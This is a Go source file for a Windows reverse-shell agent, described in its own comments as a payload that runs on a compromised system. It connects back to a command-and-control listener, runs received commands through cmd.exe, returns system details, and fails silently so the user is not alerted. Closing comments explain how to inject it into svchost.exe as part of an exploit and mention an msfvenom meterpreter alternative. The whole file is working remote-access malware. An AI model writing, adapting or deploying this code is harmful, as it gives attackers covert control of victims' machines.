package main

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"time"
)

// ReverseShellAgent is the usermode payload that runs on compromised system
// It connects back to C2 listener and executes commands
func main() {
	// Configuration - would be embedded/patched before compilation
	c2Host := os.Getenv("C2_HOST")
	if c2Host == "" {
		c2Host = "127.0.0.1" // Fallback for testing
	}

	c2PortStr := os.Getenv("C2_PORT")
	if c2PortStr == "" {
		c2PortStr = "4444"
	}

	// Connect to C2
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", c2Host, c2PortStr))
	if err != nil {
		// Silent fail - don't alert user
		os.Exit(1)
	}
	defer conn.Close()

	// Main command loop
	runShell(conn)
}

// CommandRequest represents incoming command from C2
type CommandRequest struct {
	ID     int    `json:"id"`
	Method string `json:"method"`
	Params struct {
		Cmd string `json:"cmd"`
	} `json:"params"`
}

// CommandResponse represents response to send back
type CommandResponse struct {
	ID     int    `json:"id"`
	Result string `json:"result"`
	Error  string `json:"error,omitempty"`
}

// runShell handles command execution loop
func runShell(conn net.Conn) {
	decoder := json.NewDecoder(conn)
	encoder := json.NewEncoder(conn)

	for {
		var req CommandRequest
		if err := decoder.Decode(&req); err != nil {
			// Connection closed or malformed data
			break
		}

		// Execute command based on method
		var result string
		var execErr string

		switch req.Method {
		case "exec":
			// Execute shell command
			output, err := executeCommand(req.Params.Cmd)
			result = output
			if err != nil {
				execErr = err.Error()
			}

		case "exit":
			// Close connection
			return

		case "info":
			// Return system info
			result = getSystemInfo()

		default:
			execErr = fmt.Sprintf("Unknown method: %s", req.Method)
		}

		// Send response
		resp := CommandResponse{
			ID:     req.ID,
			Result: result,
			Error:  execErr,
		}

		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		encoder.Encode(resp)
		conn.SetWriteDeadline(time.Time{})
	}
}

// executeCommand runs a shell command and returns output
func executeCommand(cmd string) (string, error) {
	// Use cmd.exe /c to execute commands (Windows only)
	c := exec.Command("cmd.exe", "/c", cmd)

	output, err := c.CombinedOutput()
	if err != nil {
		return string(output), err
	}

	return string(output), nil
}

// getSystemInfo returns basic system information
func getSystemInfo() string {
	info := fmt.Sprintf("System: %s\nUser: %s\n", os.Getenv("OS"), os.Getenv("USERNAME"))

	// Could add more info like hostname, IP address, etc.
	if hostname, err := os.Hostname(); err == nil {
		info += fmt.Sprintf("Hostname: %s\n", hostname)
	}

	return info
}

// Note: To embed this in exploit:
// 1. Compile: go build -o agent.exe cmd/payload/agent.go
// 2. Create stub that:
//    a. Spawns svchost.exe or cmd.exe
//    b. Injects agent.exe into process
//    c. Sets C2_HOST and C2_PORT environment variables
//    d. Returns to kernel
//
// Alternative: Use msfvenom to wrap this agent:
// msfvenom -p windows/meterpreter/reverse_tcp LHOST=... LPORT=...
